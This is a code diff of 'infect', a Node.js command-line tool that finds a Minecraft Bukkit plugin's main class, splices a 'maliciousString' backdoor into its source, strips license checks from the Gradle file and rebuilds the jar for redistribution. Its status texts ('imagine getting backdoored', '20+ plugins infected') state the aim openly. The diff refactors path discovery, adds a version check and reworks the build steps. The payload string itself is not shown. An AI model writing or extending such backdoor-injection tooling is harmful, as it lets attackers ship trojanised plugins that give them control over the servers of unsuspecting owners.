@@ -3,7 +3,7 @@ global.startT = +new Date();
 const os = require("os");
 let osType = os.type();
 // imports
-const { readdirSync, statSync, fstat, readFileSync } = require("fs");
+const { readdirSync, statSync, readFileSync } = require("fs");
 const openExplorer = require("open-file-explorer");
 const { join } = require("path");
 const utils = require("./utils");
@@ -13,19 +13,21 @@ const fs = require("fs");
 const yaml = require("js-yaml");
 global.chalk = require("chalk");
 global.figlet = require("figlet");
-global.client = require("discord-rich-presence")("829742157588856912");
-const { get, set } = require("./config");
+global.client;
+const { get } = require("./config");
 const { exec } = require("child-process-async");
-const commandExists = require("command-exists-promise");
-const { isRegExp } = require("util");
 let slash = "/";
 if (osType === "Windows_NT") slash = "\\";
 
 // declerations
 let files = [];
-global.path;
+
+global.mainPath; //New var for keeping the true location
+global.basePath; //New var for keeping track of the location of pom.xml and Gradlew
+
 global.done = false;
 auto = process.argv.includes("--auto");
+explorer = !process.argv.includes("-noopen");
 global.rpcConnected = false;
 let buildType = "Unknown";
 let pluginName;
@@ -35,24 +37,57 @@ const rl = readline.createInterface({
     output: process.stdout,
     terminal: false,
 });
-let statuses = ["infected in 13.69 seconds lul", "best infect cli", "imagine getting backdoored", "qlutch go brrr", "infect.kaddon.wtf", "20+ plugins infected >:)", "mcforceop.com"]
-
+let statuses = [
+    "infected in 13.69 seconds lul",
+    "best infect cli",
+    "imagine getting backdoored",
+    "qlutch go brrr",
+    "infect.kaddon.wtf",
+    "20+ plugins infected >:)",
+    "mcforceop.com",
+];
 // yml object
 let ymls = {};
 
 // init startup
-
 (async () => {
-    //Initialize Discord rich presence
-    await utils.startup();
+    let ver = require("../package.json").version;
+    const request = require("node-fetch").default;
+    let data = await request(
+        "https://raw.githubusercontent.com/kaddon-wtf/infect-cli/main/package.json"
+    );
+    data = await data.json();
+    let tmp = ver.split(".");
+    let tmp2 = tmp.pop();
+    myVer = parseFloat(tmp.join(".") + tmp2);
+
+    tmp = data.version.split(".");
+    tmp2 = tmp.pop();
+    webVer = parseFloat(tmp.join(".") + tmp2);
+    if (webVer > myVer) {
+        console.log("There seems to be a new version available!");
+        console.log(`Your on ${ver}, server is on ${data.version}`);
+        console.log("Continuing in 5 seconds");
+        setTimeout(async () => {
+            await utils.startup();
+        }, 5000);
+    } else {
+        //Initialize Discord rich presence
+        await utils.startup();
+    }
 })();
 
 // search for path
 let interval = setInterval(() => {
     // if path was found
     if (done) {
+        console.log("q");
+        if (global.basePath === undefined) {
+            console.log("Could not find a project, add -h for help!");
+            process.exit();
+        }
         clearInterval(interval);
-        buildDection(path).then((r) => {
+        buildDection(basePath).then((r) => {
             switch (r) {
                 case "Maven":
                     buildType = r;
@@ -86,10 +121,10 @@ let interval = setInterval(() => {
 // start function
 async function start() {
     // set plugin name to folder name
-    pluginName = path.split(slash).slice(-1).join(" ");
+    pluginName = basePath.split(slash).slice(-1).join(" ");
     if (rpcConnected) {
         client.updatePresence({
-            state: statuses[Math.floor(Math.random()*statuses.length)],
+            state: statuses[Math.floor(Math.random() * statuses.length)],
             details: `infecting ${pluginName}`,
             startTimestamp: Date.now(),
             largeImageKey: "kaddon",
@@ -101,7 +136,7 @@ async function start() {
     }
     let count = 0;
     //Search for the YML
-    let arr = pluginYMLSearch(path);
+    let arr = pluginYMLSearch(basePath);
     //If Not found
     if (!arr) {
         console.log(
@@ -124,166 +159,34 @@ async function start() {
         ymls[count] = { element };
         console.log(`[${chalk.hex(utils.randomColor())(count)}] ${name}`);
     });
-    //Ask the user what yml to read.
-    rl.question(`Pick a number ${arrow} `, async (r) => {
-        console.clear();
-
-        figlet("infect", function (err, data) {
-            console.log(chalk.hex("#c93849")(data));
-        });
-        //Invalid Number
-        if (!ymls[r]) {
-            console.log("Invalid number, exiting infect..");
-            process.exit();
-        }
-        //read the selected YML
-        const pluginYML = readFileSync(ymls[r].element, {
+    if (!ymls[2]) {
+        console.log("Scanning...");
+        const pluginYML = readFileSync(ymls[1].element, {
             encoding: "utf8",
             flag: "r",
         });
-        try {
-            //Load the YAML
-            const doc = yaml.load(pluginYML);
-            //Find main class
-            if (doc["main"]) {
-                var fileString = ymls[r].element.split(slash);
-                let index = 0;
-                let srcIndex = 0;
-                fileString.forEach((element) => {
-                    index++;
-                    if (element == "src") {
-                        srcIndex = index;
-                    }
-                });
-                var srcDir = fileString.slice(srcIndex - 1);
-                // remove resources & plugin.yml
-                srcDir.pop();
-                srcDir.pop();
-                srcDir.push("java");
-                // join
-                srcDir = srcDir.join(slash);
-                let mainClass =
-                    srcDir +
-                    slash +
-                    doc["main"].split(".").join(slash) +
-                    ".java";
-                let mainClassName = mainClass.split(slash).pop();
-                console.log(
-                    `The main class in ${pluginName.replace(
-                        /\s/g,
-                        ""
-                    )} is ${chalk.hex("#c93849")(
-                        mainClassName.replace(/\s/g, "")
-                    )}`
-                );
-                // Auto Infect - HH
+        infect(pluginYML);
+    } else {
+        //Ask the user what yml to read.
+        rl.question(`Pick a number ${arrow} `, async (r) => {
+            console.clear();
 
-                if (!get("autoOpenMainClass")) {
-                    if (auto) {
-                        let pathArr = ymls[r].element.split(slash);
-                        pathArr.pop();
-                        pathArr.pop();
-                        pathArr.pop();
-
-                        if (buildType === "Maven") pathArr.pop();
-
-                        basepath = pathArr.join(slash);
-
-                        //Account for previous builds.
-
-                        if (basepath.endsWith("src"))
-                            basepath = basepath.split(slash + "src")[0];
-                        if (!fs.existsSync(`${basepath}${slash}${mainClass}`)) {
-                            pathArr.push("src");
-                            pathArr.push("main");
-                            path = basepath + `${slash}src${slash}main`;
-                        } else {
-                            path = basepath;
-                        }
-                        console.log(path);
-                        if (buildType !== "Maven") {
-                            let t = basepath.split(slash);
-                            t.pop();
-                            basepath = t.join(slash);
-                        }
-                        await Inject(path, mainClass, basepath);
-                    } else {
-                        rl.question(
-                            `Would you like to attempt auto infection? [Y/N] ${arrow}`,
-                            async (res) => {
-                                switch (res.toLowerCase()) {
-                                    case "y":
-                                        let pathArr = ymls[r].element.split(
-                                            slash
-                                        );
-                                        pathArr.pop();
-                                        pathArr.pop();
-                                        pathArr.pop();
-
-                                        if (buildType === "Maven")
-                                            pathArr.pop();
-
-                                        basepath = pathArr.join(slash);
-
-                                        //Account for previous builds.
-
-                                        if (
-                                            !fs.existsSync(
-                                                `${basepath}${slash}${mainClass}`
-                                            )
-                                        ) {
-                                            pathArr.push("src");
-                                            pathArr.push("main");
-                                            path =
-                                                basepath +
-                                                `${slash}src${slash}main`;
-                                        } else {
-                                            path = basepath;
-                                        }
-                                        console.log(path);
-                                        if (buildType !== "Maven") {
-                                            let t = basepath.split(slash);
-                                            t.pop();
-                                            basepath = t.join(slash);
-                                        }
-                                        await Inject(path, mainClass, basepath);
-                                        break;
-                                    case "n":
-                                        rl.question(
-                                            `Want to open this file? [Y/N] ${arrow} `,
-                                            async (reply) => {
-                                                switch (reply.toLowerCase()) {
-                                                    case "y":
-                                                        let pathArr = ymls[
-                                                            r
-                                                        ].element.split(slash);
-                                                        openFile(
-                                                            pathArr,
-                                                            mainClass,
-                                                            mainClassName
-                                                        );
-                                                        break;
-                                                    default:
-                                                    case "n":
-                                                        break;
-                                                }
-                                            }
-                                        );
-                                }
-                            }
-                        );
-                    }
-                } else {
-                    let pathArr = ymls[r].element.split(slash);
-                    openFile(pathArr, mainClass, mainClassName);
-                }
-            } else {
-                console.log(`There was no main class found in this yml`);
+            figlet("infect", function (err, data) {
+                console.log(chalk.hex("#c93849")(data));
+            });
+            //Invalid Number
+            if (!ymls[r]) {
+                console.log("Invalid number, exiting infect..");
+                process.exit();
             }
-        } catch (e) {
-            console.log(`Error:\n${e.message}`);
-        }
-    });
+            //read the selected YML
+            const pluginYML = readFileSync(ymls[r].element, {
+                encoding: "utf8",
+                flag: "r",
+            });
+            infect(pluginYML);
+        });
+    }
 }
 
 /*/
@@ -327,7 +230,7 @@ function buildDection(dir) {
 
 //Automatically Inject
 // Credit: H H
-async function Inject(path, main, basepath) {
+async function Inject(mainPath) {
     try {
         let ExistI = [];
         const maliciousString =
@@ -352,11 +255,13 @@ async function Inject(path, main, basepath) {
             "org.bukkit.plugin.Plugin",
             "org.bukkit.*",
         ];
+
         let TMP = process.env.TMP || "/tmp";
         TMP = TMP + slash + "Infect";
+
         if (!fs.existsSync(TMP)) fs.mkdirSync(TMP);
         let missedLines = [];
-        var instream = fs.createReadStream(path + slash + main);
+        var instream = fs.createReadStream(mainPath);
         var outstream = new stream();
         var rls = readline.createInterface(instream, outstream);
         console.log("Infecting...");
@@ -420,14 +325,14 @@ async function Inject(path, main, basepath) {
                         console.log("Waiting...");
                         setTimeout(() => {
                             console.log("Overwriting file...");
-                            fs.copyFileSync(
-                                `${TMP}${slash}inj.java`,
-                                path + slash + main
-                            );
+                            fs.copyFileSync(`${TMP}${slash}inj.java`, mainPath);
                             console.log("Cleaning up..");
-                            fs.unlinkSync(`${TMP}${slash}inj.java`);
+                            fs.unlinkSync(`${TMP}${slash}inj.java`, {
+                                recursive: true,
+                                force: true,
+                            });
                             console.log("Finished.");
-                            if (!buildType !== "Unknown") comp(basepath);
+                            if (!buildType !== "Unknown") comp(basePath);
                         }, 125);
                     }
                 }
@@ -441,291 +346,166 @@ async function Inject(path, main, basepath) {
 }
 
 async function comp(dst) {
-    let TMP = process.env.TMP || "/tmp";
     let rl2 = readline.createInterface({
         input: process.stdin,
         output: process.stdout,
         terminal: false,
     });
     if (auto) {
-        switch (buildType.toLowerCase()) {
-            case "gradle":
-                if (dst.startsWith(TMP)) {
-                    path = dst;
-                }
-                console.log("Building...... please dont exit.");
-                console.log(
-                    "If its your first time running, it may take a while"
-                );
-                console.log(
-                    "If it seems extraordinarily slow, exit and try running gradlew build in " +
-                        dst
-                );
-                exec(
-                    `cd "${dst}" && gradlew build`,
-                    async (err, stdout, stderr) => {
-						if(!stdout.includes("BUILD SUCCESSFUL")){
-							console.log(`Hey uh, the build was not successful. Try running gradlew build in ${dst}`);
-							process.exit();
-						}
-                        console.log(
-                            "Build finished" +
-                                stdout
-                                    .split("BUILD SUCCESSFUL")[1]
-                                    .split("s")[0] +
-                                "s"
-                        );
-                        if (path.startsWith(TMP)) {
-                            const dstn =
-                                require("os").homedir() + slash + "Qlutch";
-
-                            if (!fs.existsSync(dstn)) fs.mkdirSync(dstn);
-                            console.log("mv");
-                            readdirSync(path + slash + "jars").forEach(
-                                (File) => {
-                                    const newPth = join(
-                                        path + slash + "jars",
-                                        File
-                                    );
-                                    if (newPth.endsWith("jar"))
-                                        fs.copyFileSync(
-                                            newPth,
-                                            dstn + slash + File
-                                        );
-                                }
-                            );
-                            console.log("cleaning up");
-                            fs.rmdirSync(TMP + slash + "Infect-Git", {
-                                recursive: true,
-                            });
-                            console.log("Opening location");
-                            openExplorer(dstn);
-                        } else {
-                            console.log("Opening location");
-                            openExplorer(dst + slash + "jars");
-                        }
-                    }
-                );
-                break;
-            case "maven":
-                if (dst.startsWith(TMP)) {
-                    path = dst;
-                }
-                console.log("Building...... please dont exit.");
-                console.log(
-                    "If its your first time running, it may take a while"
-                );
-                console.log(
-                    "If it seems extraordinarily slow, exit and try running mvn clean verify in " +
-                        dst
-                );
-                exec(
-                    `cd "${dst}" && mvn clean verify`,
-                    async (err, stdout, stderr) => {
-						if(stdout.includes("BUILD FAILURE")){
-							console.log(`Hey uh, the build was not successful. Try running mvn clean verify in ${dst}`);
-							process.exit();
-						}
-                        console.log(
-                            "Build finished " +
-                                stdout
-                                    .split("Total time:  ")[1]
-                                    .split(" s")[0] +
-                                "s"
-                        );
-                        if (path.startsWith(TMP)) {
-                            const dstn =
-                                require("os").homedir() + slash + "Qlutch";
-
-                            if (!fs.existsSync(dstn)) fs.mkdirSync(dstn);
-                            readdirSync(path + slash + "target").forEach(
-                                (File) => {
-                                    const newPth = join(
-                                        path + slash + "target",
-                                        File
-                                    );
-                                    if (newPth.endsWith("jar"))
-                                        fs.copyFileSync(
-                                            newPth,
-                                            dstn + slash + File
-                                        );
-                                }
-                            );
-                            console.log("cleaning up");
-                            //fs.rmdirSync(TMP + slash + "Infect-Git", {recursive: true,});
-                            console.log("Opening location");
-                            openExplorer(dstn);
-                        } else {
-                            console.log("Opening location");
-                            openExplorer(dst + slash + "target");
-                        }
-                    }
-                );
-                break;
-
-            default:
-                if (await fs.existsSync(TMP + slash + "Infect-Git"))
-                    fs.rmdirSync(TMP + slash + "Infect-Git", {
-                        recursive: true,
-                    });
-        }
+        build(buildType, dst);
     } else {
         rl2.question(
             `Would you like to try building this with ${buildType}? [Y/N] ${arrow}`,
             async (resp) => {
                 switch (resp.toLowerCase()) {
                     case "y":
-                        switch (buildType.toLowerCase()) {
-                            case "gradle":
-                                if (dst.startsWith(TMP)) {
-                                    path = dst;
-                                }
-                                console.log("Building...... please dont exit.");
-                                console.log(
-                                    "If its your first time running, it may take a while"
-                                );
-                                console.log(
-                                    "If it seems extraordinarily slow, exit and try running gradlew build in " +
-                                        dst
-                                );
-                                exec(
-                                    `cd "${dst}" && gradlew build`,
-                                    async (err, stdout, stderr) => {
-										if(!stdout.includes("BUILD SUCCESSFUL")){
-											console.log(`Hey uh, the build was not successful. Try running gradlew build in ${dst}`);
-											process.exit();
-										}
-                                        console.log(
-                                            "Build finished" +
-                                                stdout
-                                                    .split(
-                                                        "BUILD SUCCESSFUL"
-                                                    )[1]
-                                                    .split("s")[0] +
-                                                "s"
-                                        );
-                                        if (path.startsWith(TMP)) {
-                                            const dstn =
-                                                require("os").homedir() +
-                                                slash +
-                                                "Qlutch";
-
-                                            if (!fs.existsSync(dstn))
-                                                fs.mkdirSync(dstn);
-                                            console.log("mv");
-                                            readdirSync(
-                                                path + slash + "jars"
-                                            ).forEach((File) => {
-                                                const newPth = join(
-                                                    path + slash + "jars",
-                                                    File
-                                                );
-                                                if (newPth.endsWith("jar"))
-                                                    fs.copyFileSync(
-                                                        newPth,
-                                                        dstn + slash + File
-                                                    );
-                                            });
-                                            console.log("cleaning up");
-                                            fs.rmdirSync(
-                                                TMP + slash + "Infect-Git",
-                                                {
-                                                    recursive: true,
-                                                }
-                                            );
-                                            console.log("Opening location");
-                                            openExplorer(dstn);
-                                        } else {
-                                            console.log("Opening location");
-                                            openExplorer(dst + slash + "jars");
-                                        }
-                                    }
-                                );
-                                break;
-                            case "maven":
-                                if (dst.startsWith(TMP)) {
-                                    path = dst;
-                                }
-                                console.log("Building... please dont exit.");
-                                console.log(
-                                    "If its your first time running, it may take a while"
-                                );
-                                console.log(
-                                    "If it seems extraordinarily slow, exit and try running mvn clean verify in " +
-                                        dst
-                                );
-                                exec(
-                                    `cd "${dst}" && mvn clean verify`,
-                                    async (err, stdout, stderr) => {
-										if(stdout.includes("BUILD FAILURE")){
-											console.log(`Hey uh, the build was not successful. Try running mvn clean verify in ${dst}`);
-											process.exit();
-										}
-                                        console.log(
-                                            "Build finished" +
-                                                stdout
-                                                    .split("Total time:  ")[1]
-                                                    .split(" s")[0] +
-                                                " s"
-                                        );
-                                        if (path.startsWith(TMP)) {
-                                            const dstn =
-                                                require("os").homedir() +
-                                                slash +
-                                                "Qlutch";
-
-                                            if (!fs.existsSync(dstn))
-                                                fs.mkdirSync(dstn);
-                                            readdirSync(
-                                                path + slash + "target"
-                                            ).forEach((File) => {
-                                                const newPth = join(
-                                                    path + slash + "target",
-                                                    File
-                                                );
-                                                if (newPth.endsWith("jar"))
-                                                    fs.copyFileSync(
-                                                        newPth,
-                                                        dstn + slash + File
-                                                    );
-                                            });
-                                            console.log("cleaning up");
-                                            //fs.rmdirSync(TMP + slash + "Infect-Git", {recursive: true,});
-                                            console.log("Opening location");
-                                            openExplorer(dstn);
-                                        } else {
-                                            console.log("Opening location");
-                                            openExplorer(
-                                                dst + slash + "target"
-                                            );
-                                        }
-                                    }
-                                );
-                                break;
-                            default:
-                                if (
-                                    await fs.existsSync(
-                                        TMP + slash + "Infect-Git"
-                                    )
-                                )
-                                    fs.rmdirSync(TMP + slash + "Infect-Git", {
-                                        recursive: true,
-                                    });
-                        }
+                        build(buildType, dst);
+                    case "n":
+                        return;
+                    default:
+                        comp(dst);
                 }
             }
         );
     }
 }
+/// Vars for the below scanner ///
+let scan = true;
+let dirScan = true;
+async function getMainPath(path, classname, directories = []) {
+    readdirSync(path).forEach((f) => {
+        if (scan === false) return;
+        const Absolute = join(path, f);
+        if (statSync(Absolute).isDirectory()) {
+            if (!dirScan) return;
+            if (f.startsWith(".")) return;
+            return getMainPath(Absolute, classname, directories);
+        }
+        if (f === classname && Absolute.includes(directories.join(slash))) {
+            console.log("Found! " + Absolute);
+            scan = false;
+            mainPath = Absolute;
+            return f;
+        }
+    });
+}
+let trueMain = "";
+async function getTrueMain(mainYML) {
+    let base = basePath + slash + "pom.xml";
+    console.log(base);
+    let FirstSearch = mainYML.split("${")[1].split("}")[0];
+    console.log("searching: " + FirstSearch);
+    const data = readFileSync(base, { encoding: "utf8", flag: "r" });
+    let mainData = data
+        .split(`<${FirstSearch}>`)[1]
+        .split(`</${FirstSearch}>`)[0];
+
+    mainData = mainData.match(/(\${(.+?)\})/g); //Returns an array
+    //Clean Main
+    let neededData = [];
+    mainData.forEach((m) => {
+        let cleaned = m.replace(/(\${|}|project\.)/g, "");
+        neededData.push(cleaned);
+    });
+
+    console.log(neededData);
+
+    for (const searchStr of neededData) {
+        await search(data, searchStr);
+    }
+    console.log(trueMain);
+    return trueMain;
+}
+
+async function search(input, searchingFor) {
+    console.log(searchingFor);
+    let result = input
+        .split(`<${searchingFor}>`)[1]
+        .split(`</${searchingFor}>`)[0];
+    console.log(result);
+    if (result === input) return false;
+    if (result.startsWith("${")) {
+        let cleaned = result.replace(/(\${|})/g, "");
+        //too lazy to make this automated
+        if (input.split(`<${cleaned}>`).length > 1)
+            return search(input, cleaned);
+        if (input.split(`<${cleaned.replace("project.")}>`).length > 1)
+            return search(input, cleaned.replace("project."));
+        return search(input, result);
+    }
+    if (trueMain === "") {
+        trueMain += result;
+    } else trueMain += `.${result}`;
+}
+
+async function infect(pluginYML) {
+    //grab main from YML
+    let ymlMain = await grabMain(pluginYML);
+    if (ymlMain) {
+        if (ymlMain.startsWith("${")) ymlMain = await getTrueMain(ymlMain);
+        let pluginMainClass = ymlMain.split(".").pop() + ".java";
+        let directories = ymlMain.split(".");
+        directories.pop();
+        await getMainPath(basePath, pluginMainClass, directories);
+        if (!mainPath) return console.log("Couldn't find main class...");
+        let mainClassName = mainPath.split(slash).pop();
+        console.log(
+            `The main class in ${pluginName} is ${chalk.hex("#c93849")(
+                mainClassName
+            )}`
+        );
+        // Auto Infect - HH
+
+        if (!get("autoOpenMainClass")) {
+            if (auto) {
+                await Inject(mainPath);
+            } else {
+                rl.question(
+                    `Would you like to attempt auto infection? [Y/N] ${arrow}`,
+                    async (res) => {
+                        switch (res.toLowerCase()) {
+                            case "y":
+                                await Inject(mainPath);
+                                break;
+                            case "n":
+                                rl.question(
+                                    `Want to open this file? [Y/N] ${arrow} `,
+                                    async (reply) => {
+                                        switch (reply.toLowerCase()) {
+                                            case "y":
+                                                openFile(mainPath);
+                                                break;
+                                            case "n":
+                                                console.log("Goodbye");
+                                                process.exit(0);
+                                            default:
+                                                return infect(pluginYML);
+                                        }
+                                    }
+                                );
+                            default:
+                                return infect(pluginYML);
+                        }
+                    }
+                );
+            }
+        } else {
+            openFile(mainPath);
+        }
+    } else {
+        console.log(`There was no main class found in this yml`);
+    }
+}
+
+function grabMain(YMLData) {
+    let mainRes = /main\: (.*)/.exec(YMLData)[0];
+    return mainRes.split("main: ")[1];
+}
 
 // open file
-function openFile(pathArr, mainClass, mainClassName) {
-    pathArr.pop();
-    pathArr.pop();
-    pathArr.pop();
-    pathArr.pop();
+function openFile(mainPath) {
     utils
-        .whichLine(`${pathArr.join(slash)}${slash}${mainClass}`, "onEnable")
+        .whichLine(mainPath, "onEnable")
         .then(async (line) => {
             console.log(
                 `Opening ${chalk.hex("#c93849")(
@@ -734,16 +514,171 @@ function openFile(pathArr, mainClass, mainClassName) {
             );
             let vsc = await utils.VSCInstalled();
             if (vsc) {
-                utils.VSCOpenFile(
-                    `${pathArr.join(slash)}${slash}${mainClass}`,
-                    line + 1,
-                    3
-                );
+                utils.VSCOpenFile(mainPath, line + 1, 3);
             } else {
-                openExplorer(`${pathArr.join(slash)}${mainClass}`, (err) => {
-                    if (err) return console.log(err);
-                });
+                if (explorer)
+                    return openExplorer(mainPath, (err) => {
+                        if (err) return console.log(err);
+                    });
+                return;
             }
         })
         .catch((e) => console.log(e));
+}
+
+async function fixGradle(path, data) {
+    console.log("Fixing gradle....");
+    data = data
+        .replace(/(.*)id 'com.github.hierynomus.license'(.*)/g, "")
+        .replace(/^license {([\s\S]*?)}/gm, "")
+        .replace(/, licenseMain/g, "");
+    await fs.writeFileSync(path, data);
+    return true;
+}
+
+async function build(type, path) {
+    dst = path;
+    let TMP = process.env.TMP || "/tmp";
+    switch (type.toLowerCase()) {
+        case "gradle":
+            let gradleP = basePath + slash + "build.gradle";
+            if (!fs.existsSync(gradleP))
+                gradleP = fs.readdirSync(basePath).forEach((e) => {
+                    if (e.startsWith("build.gradle"))
+                        return basePath + slash + e;
+                });
+            let gradleData = fs.readFileSync(gradleP, { encoding: "utf-8" });
+            if (gradleData.match(/id 'com.github.hierynomus.license'(.*)/)) {
+                await fixGradle(gradleP, gradleData);
+            }
+            console.log("Building...... please dont exit.");
+            console.log("If its your first time running, it may take a while");
+            console.log(
+                "If it seems extraordinarily slow, exit and try running gradlew build in " +
+                    path
+            );
+            console.log(
+                "Gradle is bipolar and annoying to fix, so just try it urself or go to maven"
+            );
+
+            exec(
+                `cd "${path}" && git submodule update --init && gradlew build -dist`,
+                async (err, stdout, stderr) => {
+                    if (!stdout.includes("BUILD SUCCESSFUL")) {
+                        console.log("Console Output:");
+                        console.log(stdout);
+                        console.log(
+                            `Hey uh, the build was not successful. Try running gradlew build in ${path}`
+                        );
+                        process.exit();
+                    }
+                    console.log(
+                        "Build finished" +
+                            stdout.split("BUILD SUCCESSFUL")[1].split("s")[0] +
+                            "s"
+                    );
+                    if (basePath.startsWith(TMP)) {
+                        const dstn = require("os").homedir() + slash + "Qlutch";
+
+                        if (!fs.existsSync(dstn)) fs.mkdirSync(dstn);
+                        console.log("mv");
+                        let buildDirectory = (await fs.existsSync(
+                            basePath + slash + "jars"
+                        ))
+                            ? basePath + slash + "jars"
+                            : basePath + slash + "build" + slash + "libs";
+                        console.log(buildDirectory);
+                        readdirSync(buildDirectory).forEach((File) => {
+                            console.log(File);
+                            const newPth = join(buildDirectory, File);
+                            console.log(newPth);
+                            if (newPth.endsWith("jar"))
+                                fs.copyFileSync(newPth, dstn + slash + File);
+                        });
+                        console.log("cleaning up");
+                        fs.rmdirSync(basePath, {
+                            recursive: true,
+                            force: true,
+                        });
+                        console.log("Opening location");
+                        if (explorer) return openExplorer(dstn);
+                        return;
+                    } else {
+                        console.log("Opening location");
+                        if (explorer)
+                            return openExplorer(basePath + slash + "jars");
+                        return;
+                    }
+                }
+            );
+            break;
+        case "maven":
+            console.log("Building...... please dont exit.");
+            console.log("If its your first time running, it may take a while");
+            console.log(
+                "If it seems extraordinarily slow, exit and try running mvn clean verify in " +
+                    dst
+            );
+            let pomD = fs.readFileSync(basePath + slash + "pom.xml", {
+                encoding: "utf-8",
+            });
+
+            exec(
+                `cd "${dst}" && mvn clean verify -Dmaven.deploy.skip=true`,
+                async (err, stdout, stderr) => {
+                    if (stdout.includes("BUILD FAILURE")) {
+                        console.log("Output:");
+                        console.log(stdout);
+                        console.log(
+                            `Hey uh, the build was not successful. Try running mvn clean verify in ${dst}`
+                        );
+                        process.exit();
+                    }
+                    console.log(
+                        "Build finished " +
+                            stdout.split("Total time:  ")[1].split(" s")[0] +
+                            "s"
+                    );
+                    if (basePath.startsWith(TMP)) {
+                        const dstn = require("os").homedir() + slash + "Qlutch";
+
+                        if (!fs.existsSync(dstn)) fs.mkdirSync(dstn);
+                        readdirSync(basePath + slash + "target").forEach(
+                            (File) => {
+                                const newPth = join(
+                                    basePath + slash + "target",
+                                    File
+                                );
+                                if (newPth.endsWith("jar"))
+                                    fs.copyFileSync(
+                                        newPth,
+                                        dstn + slash + File
+                                    );
+                            }
+                        );
+                        console.log("cleaning up");
+                        fs.rmdirSync(basePath, {
+                            recursive: true,
+                            force: true,
+                        });
+                        console.log("Opening location");
+                        if (explorer) return openExplorer(dstn);
+                        return;
+                    } else {
+                        console.log("Opening location");
+                        if (explorer)
+                            return openExplorer(dst + slash + "target");
+                        return;
+                    }
+                }
+            );
+            break;
+
+        default:
+            if (await fs.existsSync(TMP + slash + "Infect-Git"))
+                fs.rmdirSync(TMP + slash + "Infect-Git", {
+                    recursive: true,
+                    force: true,
+                });
+    }
 }
